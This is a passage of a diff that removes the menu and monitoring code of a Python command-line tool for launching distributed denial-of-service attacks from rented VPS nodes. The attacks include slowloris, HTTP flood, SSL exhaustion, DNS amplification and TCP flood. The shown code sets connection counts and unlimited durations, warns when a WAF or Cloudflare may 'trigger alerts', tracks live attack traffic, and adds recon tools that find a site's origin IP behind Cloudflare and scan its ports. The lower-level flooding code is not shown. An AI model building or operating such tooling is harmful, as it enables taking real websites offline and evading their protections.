-                    print(f"Cloudflare Protected: {Colors.RED if target_info['cloudflare_protected'] else Colors.GREEN}{target_info['cloudflare_protected']}{Colors.RESET}")
-                    
-                    if target_info['open_ports']:
-                        print(f"\nOpen Ports:")
-                        for port_info in target_info['open_ports']:
-                            print(f"  {port_info['port']}/tcp - {port_info['service']}")
-                    
-                    # Warning if WAF or Cloudflare is detected
-                    if target_info['waf_detected'] or target_info['cloudflare_protected']:
-                        print(f"\n{Colors.RED}[WARNING] Target is protected by WAF or Cloudflare.{Colors.RESET}")
-                        print(f"{Colors.RED}This may reduce the effectiveness of the attack or trigger alerts.{Colors.RESET}")
-                        
-                        confirm = self.terminal.input_with_prompt("Continue anyway? (y/N): ", False)
-                        if confirm.lower() != 'y':
-                            print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
-                            input("Press Enter to continue...")
-                            return
-            
-            # VPS selection
-            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
-            vps_choice = self.terminal.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
-            
-            if vps_choice.lower() == 'y':
-                selected_vps = [vps['ip_address'] for vps in online_vps]
-            else:
-                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
-                selection = self.terminal.input_with_prompt("VPS selection: ")
-                if not selection:
-                    return
-                
-                try:
-                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
-                    selected_vps = [online_vps[i]['ip_address'] for i in indices if 0 <= i < len(online_vps)]
-                except (ValueError, IndexError):
-                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
-                    input("Press Enter to continue...")
-                    return
-            
-            if not selected_vps:
-                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # Attack parameters
-            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
-            
-            # Connection validation
-            def validate_connections(conn_str):
-                try:
-                    conn = int(conn_str)
-                    if conn < 1:
-                        return False, "Connections must be at least 1"
-                    return True, ""
-                except ValueError:
-                    return False, "Connections must be a number"
-            
-            # Delay validation
-            def validate_delay(delay_str):
-                try:
-                    delay = int(delay_str)
-                    if delay < 0:
-                        return False, "Delay cannot be negative"
-                    return True, ""
-                except ValueError:
-                    return False, "Delay must be a number"
-            
-            # Duration validation
-            def validate_duration(duration_str):
-                try:
-                    duration = int(duration_str)
-                    if duration < 0:
-                        return False, "Duration cannot be negative"
-                    return True, ""
-                except ValueError:
-                    return False, "Duration must be a number"
-            
-            parameters = {}
-            
-            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'http_flood', 'ssl_exhaust']:
-                connections_str = self.terminal.input_with_prompt("Connections per VPS (default 100): ", False, validate_connections) or "100"
-                parameters['connections'] = int(connections_str)
-                
-                delay_str = self.terminal.input_with_prompt("Delay between packets in seconds (default 15): ", False, validate_delay) or "15"
-                parameters['delay'] = int(delay_str)
-                
-                if attack_type == 'http_flood':
-                    requests_str = self.terminal.input_with_prompt("Requests per connection (default 1000): ", False, validate_connections) or "1000"
-                    parameters['requests'] = int(requests_str)
-            
-            duration_str = self.terminal.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False, validate_duration) or "0"
-            parameters['duration'] = int(duration_str)
-            
-            # Attack summary
-            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
-            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
-            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
-            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
-            
-            if 'connections' in parameters:
-                print(f"Connections per VPS: {Colors.YELLOW}{parameters['connections']:,}{Colors.RESET}")
-                print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * parameters['connections']:,}{Colors.RESET}")
-            
-            if 'delay' in parameters:
-                print(f"Packet Delay: {Colors.YELLOW}{parameters['delay']}s{Colors.RESET}")
-            
-            if 'requests' in parameters:
-                print(f"Requests per Connection: {Colors.YELLOW}{parameters['requests']:,}{Colors.RESET}")
-            
-            print(f"Duration: {Colors.YELLOW}{'Unlimited' if parameters['duration'] == 0 else f'{parameters['duration']}s'}{Colors.RESET}")
-            
-            # Final confirmation
-            print(f"\n{Colors.RED}LAUNCH ATTACK? (y/N): {Colors.RESET}", end="")
-            confirm = input().strip().lower()
-            
-            if confirm != 'y':
-                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # Create attack session
-            session_name = f"{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-            
-            session_id, message = self.db_manager.create_attack_session(
-                session_name, target_url, target_host, attack_type, selected_vps, parameters
-            )
-            
-            if not session_id:
-                print(f"{Colors.RED}[ERROR] Failed to create attack session: {message}{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            # Launch attack based on type
-            success = False
-            
-            if attack_type == 'dns_amplification':
-                success = self.attack_manager.launch_dns_amplification(session_id, target_host, selected_vps, parameters)
-            elif attack_type == 'tcp_flood':
-                # For TCP flood, we need a port
-                port_str = self.terminal.input_with_prompt("Target port: ", validate_func=self.security_manager.validate_port)
-                if not port_str:
-                    return
-                port = int(port_str)
-                success = self.attack_manager.launch_tcp_flood(session_id, target_host, port, selected_vps, parameters)
-            else:
-                # Standard attack types
-                success = self.attack_manager.launch_attack(session_id, target_url, attack_type, selected_vps, parameters)
-            
-            if success:
-                print(f"\n{Colors.GREEN}[SUCCESS] ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
-                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
-                
-                # Auto-start monitoring
-                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
-                self.monitor_attack(session_id)
-            else:
-                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
-                input("Press Enter to continue...")
-                
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
-            input("Press Enter to continue...")
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-            logger.error(f"Error launching attack: {str(e)}")
-            logger.error(traceback.format_exc())
-            input("Press Enter to continue...")
-    
-    def monitor_attack(self, session_id=None):
-        """Monitor active attacks with improved terminal input handling"""
-        if session_id is None:
-            # List active attacks
-            if not self.attack_manager.active_attacks:
-                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
-            for sid, attack_info in self.attack_manager.active_attacks.items():
-                attack_name = self.attack_manager.get_available_attack_methods().get(attack_info['attack_type'], attack_info['attack_type'])
-                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
-            
-            try:
-                session_input = self.terminal.input_with_prompt("Enter session ID to monitor: ")
-                if not session_input or not session_input.isdigit():
-                    return
-                session_id = int(session_input)
-            except (ValueError, KeyboardInterrupt):
-                return
-        
-        if session_id not in self.attack_manager.active_attacks:
-            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time attack monitoring...{Colors.RESET}")
-        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
-        time.sleep(2)
-        
-        try:
-            refresh_interval = 5  # seconds
-            while session_id in self.attack_manager.active_attacks:
-                status_data = self.attack_manager.get_attack_status(session_id)
-                attack_info = self.attack_manager.active_attacks[session_id]
-                
-                # Clear screen and display status
-                self.terminal.clear_screen()
-                
-                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
-                print(f"{Colors.BOLD}{Colors.RED}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
-                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
-                
-                attack_name = self.attack_manager.get_available_attack_methods().get(attack_info.get('attack_type'), attack_info.get('attack_type', 'Unknown'))
-                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
-                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
-                
-                if attack_info.get('start_time'):
-                    uptime = datetime.now() - attack_info['start_time']
-                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
-                
-                # Parameters display
-                params = attack_info.get('parameters', {})
-                params_str = " | ".join(f"{k}: {v}" for k, v in params.items())
-                print(f"{Colors.PURPLE}[PARAMS]  {params_str}{Colors.RESET}")
-                
-                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
-                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'CPU':<12} {'Data Sent':<15} {'Uptime'}")
-                print("-" * 95)
-                
-                total_processes = 0
-                active_vps = 0
-                total_bytes_sent = 0
-                
-                for vps_ip, data in status_data.items():
-                    processes = data.get('active_processes', 0)
-                    status = "ATTACKING" if processes > 0 else "IDLE"
-                    color = Colors.GREEN if processes > 0 else Colors.RED
-                    conn_info = data.get('connections_info', '')
-                    cpu_info = data.get('cpu_info', '')
-                    bytes_sent = data.get('bytes_sent', 0)
-                    uptime = data.get('uptime', 0)
-                    
-                    # Format bytes sent
-                    if bytes_sent > 1024*1024*1024:
-                        bytes_display = f"{bytes_sent/(1024*1024*1024):.2f} GB"
-                    elif bytes_sent > 1024*1024:
-                        bytes_display = f"{bytes_sent/(1024*1024):.2f} MB"
-                    elif bytes_sent > 1024:
-                        bytes_display = f"{bytes_sent/1024:.2f} KB"
-                    else:
-                        bytes_display = f"{bytes_sent} B"
-                    
-                    # Format uptime
-                    if uptime > 3600:
-                        uptime_display = f"{uptime//3600}h {(uptime%3600)//60}m"
-                    elif uptime > 60:
-                        uptime_display = f"{uptime//60}m {uptime%60}s"
-                    else:
-                        uptime_display = f"{uptime}s"
-                    
-                    total_processes += processes
-                    total_bytes_sent += bytes_sent
-                    if processes > 0:
-                        active_vps += 1
-                    
-                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {cpu_info:<12} {bytes_display:<15} {uptime_display}")
-                
-                # Format total bytes sent
-                if total_bytes_sent > 1024*1024*1024:
-                    total_bytes_display = f"{total_bytes_sent/(1024*1024*1024):.2f} GB"
-                elif total_bytes_sent > 1024*1024:
-                    total_bytes_display = f"{total_bytes_sent/(1024*1024):.2f} MB"
-                elif total_bytes_sent > 1024:
-                    total_bytes_display = f"{total_bytes_sent/1024:.2f} KB"
-                else:
-                    total_bytes_display = f"{total_bytes_sent} B"
-                
-                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
-                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
-                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
-                print(f"{Colors.RED}Total Data Sent: {total_bytes_display}{Colors.RESET}")
-                
-                est_connections = total_processes * params.get('connections', 100)
-                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
-                
-                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring | Press 's' to stop attack{Colors.RESET}")
-                
-                # Non-blocking input check using the improved terminal helper
-                user_input = self.terminal.get_input_with_timeout("Command (s=stop, r=refresh): ", refresh_interval)
-                
-                if user_input and user_input.lower() == 's':
-                    print(f"{Colors.YELLOW}Stopping attack...{Colors.RESET}")
-                    self.attack_manager.stop_attack(session_id)
-                    break
-            
-            # If we got here and the attack is no longer active, it might have completed
-            if session_id not in self.attack_manager.active_attacks:
-                print(f"\n{Colors.GREEN}[INFO] Attack has completed or been stopped{Colors.RESET}")
-                
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
-            
-            # Ask if user wants to stop the attack
-            try:
-                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
-                if stop_attack == 'y':
-                    self.attack_manager.stop_attack(session_id)
-            except KeyboardInterrupt:
-                pass
-        
-        input("\nPress Enter to continue...")
-    
-    def attack_history_menu(self):
-        """Menu for viewing attack history"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        sessions = self.db_manager.get_attack_sessions()
-        
-        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
-        print("=" * 30)
-        
-        if not sessions:
-            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
-        else:
-            # Convert to list of lists for table printing
-            headers = ["ID", "Session Name", "Target", "Type", "Status", "Start Time"]
-            data = []
-            
-            for session in sessions:
-                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
-                status_color = Colors.GREEN if session['status'] == 'completed' else Colors.YELLOW if session['status'] == 'running' else Colors.RED
-                status = f"{status_color}{session['status']}{Colors.RESET}"
-                attack_type = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
-                
-                data.append([
-                    session['id'],
-                    session['session_name'][:24],
-                    session['target_host'][:19],
-                    attack_type,
-                    status,
-                    start_time
-                ])
-            
-            self.terminal.print_table(headers, data)
-            
-            # View details option
-            print(f"\n{Colors.BOLD}OPTIONS:{Colors.RESET}")
-            print(f"{Colors.GREEN}[1]{Colors.RESET} View Attack Details")
-            print(f"{Colors.GREEN}[2]{Colors.RESET} Filter by Status")
-            print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
-            
-            choice = self.terminal.input_with_prompt("\nSelect option: ")
-            if choice == '1':
-                session_id = self.terminal.input_with_prompt("Enter session ID to view: ")
-                if session_id and session_id.isdigit():
-                    self.view_attack_details(int(session_id))
-                    return
-            elif choice == '2':
-                print(f"\n{Colors.BOLD}FILTER BY STATUS:{Colors.RESET}")
-                print(f"{Colors.GREEN}[1]{Colors.RESET} Running")
-                print(f"{Colors.GREEN}[2]{Colors.RESET} Completed")
-                print(f"{Colors.GREEN}[3]{Colors.RESET} Stopped")
-                print(f"{Colors.GREEN}[4]{Colors.RESET} Failed")
-                print(f"{Colors.GREEN}[0]{Colors.RESET} All")
-                
-                filter_choice = self.terminal.input_with_prompt("Select status: ")
-                if filter_choice == '1':
-                    self.view_filtered_attacks('running')
-                elif filter_choice == '2':
-                    self.view_filtered_attacks('completed')
-                elif filter_choice == '3':
-                    self.view_filtered_attacks('stopped')
-                elif filter_choice == '4':
-                    self.view_filtered_attacks('failed')
-                return
-        
-        input("\nPress Enter to continue...")
-    
-    def view_filtered_attacks(self, status):
-        """View attacks filtered by status"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        sessions = self.db_manager.get_attack_sessions(status=status)
-        
-        print(f"{Colors.BOLD}ATTACK HISTORY - {status.upper()}{Colors.RESET}")
-        print("=" * 30)
-        
-        if not sessions:
-            print(f"\n{Colors.YELLOW}No {status} attacks found{Colors.RESET}")
-        else:
-            # Convert to list of lists for table printing
-            headers = ["ID", "Session Name", "Target", "Type", "Start Time"]
-            data = []
-            
-            for session in sessions:
-                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
-                attack_type = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
-                
-                data.append([
-                    session['id'],
-                    session['session_name'][:24],
-                    session['target_host'][:19],
-                    attack_type,
-                    start_time
-                ])
-            
-            self.terminal.print_table(headers, data)
-            
-            # View details option
-            session_id = self.terminal.input_with_prompt("\nEnter session ID to view details (or Enter to go back): ", False)
-            if session_id and session_id.isdigit():
-                self.view_attack_details(int(session_id))
-                return
-        
-        input("\nPress Enter to continue...")
-    
-    def view_attack_details(self, session_id):
-        """View detailed information about an attack session"""
-        session = self.db_manager.get_attack_session(session_id)
-        
-        if not session:
-            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        self.terminal.clear_screen()
-        print(f"{Colors.BOLD}ATTACK SESSION DETAILS: {session_id}{Colors.RESET}")
-        print("=" * 50)
-        
-        # Basic info
-        print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
-        print(f"Session Name: {session['session_name']}")
-        print(f"Target URL: {session['target_url']}")
-        print(f"Target Host: {session['target_host']}")
-        attack_name = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
-        print(f"Attack Type: {attack_name}")
-        status_color = Colors.GREEN if session['status'] == 'completed' else Colors.YELLOW if session['status'] == 'running' else Colors.RED
-        print(f"Status: {status_color}{session['status']}{Colors.RESET}")
-        print(f"Start Time: {session['start_time'][:19] if session['start_time'] else 'N/A'}")
-        print(f"End Time: {session['end_time'][:19] if session['end_time'] else 'N/A'}")
-        
-        # Calculate duration if available
-        if session['start_time'] and session['end_time']:
-            try:
-                start = datetime.fromisoformat(session['start_time'])
-                end = datetime.fromisoformat(session['end_time'])
-                duration = end - start
-                print(f"Duration: {str(duration).split('.')[0]}")
-            except:
-                pass
-        
-        # Parameters
-        if session['parameters']:  # parameters column
-            try:
-                parameters = json.loads(session['parameters'])
-                print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
-                for key, value in parameters.items():
-                    print(f"{key}: {value}")
-            except:
-                pass
-        
-        # VPS nodes
-        if session['vps_nodes']:  # vps_nodes column
-            try:
-                vps_list = json.loads(session['vps_nodes'])
-                print(f"\n{Colors.BOLD}VPS NODES ({len(vps_list)}):{Colors.RESET}")
-                for i, vps in enumerate(vps_list, 1):
-                    print(f"{i}. {vps}")
-            except:
-                pass
-        
-        # Results
-        if session['results']:  # results column
-            try:
-                results = json.loads(session['results'])
-                print(f"\n{Colors.BOLD}ATTACK RESULTS:{Colors.RESET}")
-                for key, value in results.items():
-                    print(f"{key}: {value}")
-            except:
-                pass
-        
-        # Get attack results from database
-        attack_results = self.db_manager.get_attack_results(session_id)
-        if attack_results:
-            print(f"\n{Colors.BOLD}ATTACK METRICS:{Colors.RESET}")
-            
-            # Group by VPS
-            vps_metrics = {}
-            for result in attack_results:
-                vps_ip = result['vps_ip']
-                if vps_ip not in vps_metrics:
-                    vps_metrics[vps_ip] = []
-                vps_metrics[vps_ip].append(result)
-            
-            # Show metrics for each VPS
-            for vps_ip, metrics in vps_metrics.items():
-                print(f"\n{Colors.CYAN}VPS: {vps_ip}{Colors.RESET}")
-                
-                # Get the latest metric
-                latest = metrics[-1]
-                print(f"  Connections: {latest['connections_active']}")
-                print(f"  Packets Sent: {latest['packets_sent']}")
-                print(f"  Bytes Sent: {self._format_bytes(latest['bytes_sent'])}")
-                print(f"  Errors: {latest['error_count']}")
-                
-                if latest['cpu_usage']:
-                    print(f"  CPU Usage: {latest['cpu_usage']}%")
-                if latest['memory_usage']:
-                    print(f"  Memory Usage: {latest['memory_usage']}%")
-                
-                # Show response codes if available
-                if latest['response_codes']:
-                    try:
-                        response_codes = json.loads(latest['response_codes'])
-                        print(f"  Response Codes:")
-                        for code, count in response_codes.items():
-                            print(f"    {code}: {count}")
-                    except:
-                        pass
-        
-        # Notes
-        if session['notes']:  # notes column
-            print(f"\n{Colors.BOLD}NOTES:{Colors.RESET}")
-            print(session['notes'])
-        
-        # Target info
-        if session['target_info']:  # target_info column
-            try:
-                target_info = json.loads(session['target_info'])
-                print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
-                
-                if 'waf_detected' in target_info:
-                    print(f"WAF Detected: {Colors.RED if target_info['waf_detected'] else Colors.GREEN}{target_info['waf_detected']}{Colors.RESET}")
-                    if target_info['waf_detected'] and target_info.get('waf_type'):
-                        print(f"WAF Type: {target_info['waf_type']}")
-                
-                if 'cloudflare_protected' in target_info:
-                    print(f"Cloudflare Protected: {Colors.RED if target_info['cloudflare_protected'] else Colors.GREEN}{target_info['cloudflare_protected']}{Colors.RESET}")
-                
-                if 'web_server' in target_info and target_info['web_server']:
-                    print(f"Web Server: {target_info['web_server']}")
-            except:
-                pass
-        
-        # Actions menu
-        print(f"\n{Colors.BOLD}ACTIONS:{Colors.RESET}")
-        print(f"{Colors.GREEN}[1]{Colors.RESET} Edit Notes")
-        if session['status'] == 'running':
-            print(f"{Colors.GREEN}[2]{Colors.RESET} Stop Attack")
-            print(f"{Colors.GREEN}[3]{Colors.RESET} Monitor Attack")
-        print(f"{Colors.GREEN}[0]{Colors.RESET} Back")
-        
-        action = self.terminal.input_with_prompt("\nSelect action: ")
-        
-        if action == "1":
-            # Edit notes
-            current_notes = session['notes'] or ""
-            print(f"\n{Colors.BOLD}CURRENT NOTES:{Colors.RESET}")
-            print(current_notes)
-            new_notes = self.terminal.input_with_prompt("\nEnter new notes (leave empty to keep current): ", False)
-            
-            if new_notes:
-                self.db_manager.update_attack_notes(session_id, new_notes)
-                print(f"{Colors.GREEN}Notes updated{Colors.RESET}")
-        
-        elif action == "2" and session['status'] == 'running':
-            # Stop attack
-            confirm = input(f"{Colors.RED}Are you sure you want to stop this attack? (y/N): {Colors.RESET}").strip().lower()
-            if confirm == 'y':
-                success, message = self.attack_manager.stop_attack(session_id)
-                if success:
-                    print(f"{Colors.GREEN}[SUCCESS] {message}{Colors.RESET}")
-                else:
-                    print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
-                input("Press Enter to continue...")
-        
-        elif action == "3" and session['status'] == 'running':
-            # Monitor attack
-            self.monitor_attack(session_id)
-    
-    def network_recon_menu(self):
-        """Menu for network reconnaissance tools"""
-        while self.running:
-            self.terminal.clear_screen()
-            self.terminal.print_banner(VERSION)
-            
-            print(f"{Colors.BOLD}NETWORK RECONNAISSANCE TOOLS{Colors.RESET}")
-            print("=" * 50)
-            
-            print(f"\n{Colors.GREEN}[1]{Colors.RESET} DNS History Lookup")
-            print(f"{Colors.GREEN}[2]{Colors.RESET} Cloudflare Bypass Detection")
-            print(f"{Colors.GREEN}[3]{Colors.RESET} WAF Detection")
-            print(f"{Colors.GREEN}[4]{Colors.RESET} Port Scanner")
-            print(f"{Colors.GREEN}[5]{Colors.RESET} SSL/TLS Certificate Checker")
-            print(f"{Colors.GREEN}[6]{Colors.RESET} Target Information Gathering")
-            print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
-            
-            choice = self.terminal.input_with_prompt("\nSelect option: ")
-            
-            if choice == "1":
-                self.dns_history_tool()
-            elif choice == "2":
-                self.cloudflare_bypass_tool()
-            elif choice == "3":
-                self.waf_detection_tool()
-            elif choice == "4":
-                self.port_scanner_tool()
-            elif choice == "5":
-                self.ssl_checker_tool()
-            elif choice == "6":
-                self.target_info_tool()
-            elif choice == "0":
-                break
-            else:
-                print(f"{Colors.RED}Invalid option{Colors.RESET}")
-                time.sleep(1)
-    
-    def dns_history_tool(self):
-        """DNS history lookup tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}DNS HISTORY LOOKUP{Colors.RESET}")
-        print("=" * 50)
-        
-        domain = self.terminal.input_with_prompt("Enter domain name: ")
-        if not domain:
-            return
-        
-        print(f"\n{Colors.CYAN}[INFO] Looking up DNS history for {domain}...{Colors.RESET}")
-        results = self.network_tools.lookup_dns_history(domain)
-        
-        print(f"\n{Colors.BOLD}CURRENT DNS RECORDS:{Colors.RESET}")
-        for record_type, values in results["current_records"].items():
-            print(f"\n{record_type} Records:")
-            if values:
-                for value in values:
-                    print(f"  {value}")
-            else:
-                print("  No records found")
-        
-        print(f"\n{Colors.BOLD}HISTORICAL DNS RECORDS:{Colors.RESET}")
-        if results["historical_records"]:
-            for record in results["historical_records"]:
-                print(f"  {record['date']} - {record['record_type']}: {record['value']}")
-        else:
-            print("  No historical records found")
-        
-        input("\nPress Enter to continue...")
-    
-    def cloudflare_bypass_tool(self):
-        """Cloudflare bypass detection tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}CLOUDFLARE BYPASS DETECTION{Colors.RESET}")
-        print("=" * 50)
-        
-        domain = self.terminal.input_with_prompt("Enter domain name: ")
-        if not domain:
-            return
-        
-        print(f"\n{Colors.CYAN}[INFO] Checking if {domain} is behind Cloudflare...{Colors.RESET}")
-        cf_results = self.network_tools.detect_cloudflare(domain)
-        
-        print(f"\n{Colors.BOLD}CLOUDFLARE DETECTION RESULTS:{Colors.RESET}")
-        print(f"Domain: {cf_results['domain']}")
-        cf_status = f"{Colors.RED}Yes{Colors.RESET}" if cf_results['is_behind_cloudflare'] else f"{Colors.GREEN}No{Colors.RESET}"
-        print(f"Behind Cloudflare: {cf_status}")
-        
-        if cf_results['is_behind_cloudflare']:
-            print(f"\n{Colors.BOLD}EVIDENCE:{Colors.RESET}")
-            for evidence in cf_results['evidence']:
-                print(f"  - {evidence}")
-            
-            print(f"\n{Colors.BOLD}CLOUDFLARE IPS:{Colors.RESET}")
-            for ip in cf_results['cloudflare_ips']:
-                print(f"  - {ip}")
-            
-            print(f"\n{Colors.CYAN}[INFO] Attempting to find origin IP...{Colors.RESET}")
-            bypass_results = self.network_tools.cloudflare_bypass(domain)
-            
-            print(f"\n{Colors.BOLD}BYPASS ATTEMPTS:{Colors.RESET}")
-            print(f"Methods used: {', '.join(bypass_results['methods_used'])}")
-            
-            print(f"\n{Colors.BOLD}POTENTIAL ORIGIN IPS:{Colors.RESET}")
-            if bypass_results['potential_origin_ips']:
-                for ip in bypass_results['potential_origin_ips']:
-                    print(f"  - {ip}")
-            else:
-                print("  No origin IPs found")
-        else:
-            print(f"\n{Colors.BOLD}DIRECT IPS:{Colors.RESET}")
-            for ip in cf_results['direct_ips']:
-                print(f"  - {ip}")
-        
-        input("\nPress Enter to continue...")
-    
-    def waf_detection_tool(self):
-        """WAF detection tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}WAF DETECTION{Colors.RESET}")
-        print("=" * 50)
-        
-        url = self.terminal.input_with_prompt("Enter URL (e.g., https://example.com): ")
-        if not url:
-            return
-        
-        # Add http:// if not present
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        
-        print(f"\n{Colors.CYAN}[INFO] Checking for WAF protection on {url}...{Colors.RESET}")
-        results = self.network_tools.detect_waf(url)
-        
-        print(f"\n{Colors.BOLD}WAF DETECTION RESULTS:{Colors.RESET}")
-        print(f"URL: {results['url']}")
-        waf_status = f"{Colors.RED}Yes - {results['waf_type']}{Colors.RESET}" if results['waf_detected'] else f"{Colors.GREEN}No{Colors.RESET}"
-        print(f"WAF Detected: {waf_status}")
-        
-        if results['waf_detected']:
-            print(f"\n{Colors.BOLD}EVIDENCE:{Colors.RESET}")
-            for evidence in results['evidence']:
-                print(f"  - {evidence}")
-            
-            print(f"\n{Colors.YELLOW}[WARNING] WAF detection may reduce attack effectiveness{Colors.RESET}")
-        else:
-            print(f"\n{Colors.GREEN}[INFO] No WAF detected. Target may be more vulnerable to attacks.{Colors.RESET}")
-        
-        input("\nPress Enter to continue...")
-    
-    def port_scanner_tool(self):
-        """Port scanner tool"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        print(f"{Colors.BOLD}PORT SCANNER{Colors.RESET}")
-        print("=" * 50)
-        
-        target = self.terminal.input_with_prompt("Enter target (domain or IP): ")
-        if not target:
-            return
-        
-        # Ask for scan type
-        print(f"\n{Colors.BOLD}SCAN TYPE:{Colors.RESET}")
-        print(f"{Colors.GREEN}[1]{Colors.RESET} Common ports (faster)")
-        print(f"{Colors.GREEN}[2]{Colors.RESET} All ports (slower)")
-        print(f"{Colors.GREEN}[3]{Colors.RESET} Custom port range")
-        
-        scan_type = self.terminal.input_with_prompt("Select scan type [1]: ", False) or "1"
-        
-        ports = None
-        if scan_type == "1":
-            # Common ports
-            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
-        elif scan_type == "2":
-            # All ports would be too slow, so we'll do the first 1000
-            ports = range(1, 1001)
-        elif scan_type == "3":
-            # Custom range
-            start_port = self.terminal.input_with_prompt("Start port: ", validate_func=self.security_manager.validate_port)
-            end_port = self.terminal.input_with_prompt("End port: ", validate_func=self.security_manager.validate_port)
-            
-            if start_port and end_port:
-                start_port = int(start_port)
-                end_port = int(end_port)
-                
-                if start_port > end_port:
-                    start_port, end_port = end_port, start_port
-                
-                ports = range(start_port, end_port + 1)
-        
-        if not ports:
-            print(f"{Colors.RED}Invalid scan type{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"\n{Colors.CYAN}[INFO] Scanning {len(ports)} ports on {target}...{Colors.RESET}")
-        
-        # Show progress bar
-        self.terminal.progress_bar(0, len(ports), prefix='Progress:', suffix='Complete', length=50)
-        
-        # Scan ports in batches to show progress
-        results = {
-            "target": target,
-            "open_ports": [],
-            "closed_ports": [],
-            "filtered_ports": []
-        }
-        
-        batch_size = max(1, len(ports) // 20)  # Update progress ~20 times
-        
-        for i in range(0, len(ports), batch_size):
-            batch = list(ports)[i:i+batch_size]
-            batch_results = self.network_tools.scan_ports(target, batch)
-            
-            results["open_ports"].extend(batch_results["open_ports"])
-            results["closed_ports"].extend(batch_results["closed_ports"])
-            results["filtered_ports"].extend(batch_results["filtered_ports"])
-            
-            # Update progress
-            self.terminal.progress_bar(min(i + batch_size, len(ports)), len(ports), prefix='Progress:', suffix='Complete', length=50)
-        
-        print(f"\n\n{Colors.BOLD}SCAN RESULTS FOR {target}:{Colors.RESET}")
-        print(f"Open ports: {len(results['open_ports'])}")
-        print(f"Closed ports: {len(results['closed_ports'])}")
